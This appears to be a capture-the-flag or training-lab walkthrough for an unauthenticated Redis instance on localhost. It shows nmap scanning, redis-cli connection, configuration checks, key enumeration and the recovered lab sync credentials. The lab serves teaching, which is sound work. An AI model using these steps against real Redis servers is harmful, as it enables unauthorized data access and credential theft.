# Redis Misconfiguration Lab Walkthrough

## Goal

Identify the Redis service, connect without authentication, enumerate stored data, and recover the operational sync credentials.

## Expected path

1. Enumerate the service:

```bash
nmap -sV -p 6380 localhost
```

2. Connect with Redis tooling:

```bash
redis-cli -h localhost -p 6380
```

3. Confirm the service is accessible without authentication:

```bash
PING
INFO server
CONFIG GET protected-mode
CONFIG GET requirepass
```

4. Enumerate keys and stored values:

```bash
KEYS *
GET public:welcome
HGETALL ops:sync
HGETALL ops:snapshot
```

5. Recover the sensitive material:

- `username = sync-user`
- `password = sync-redis-2024`
- snapshot path and ownership metadata

## Learning outcome

- Redis service identification
- unauthenticated datastore access
- data discovery through key enumeration and runtime inspection
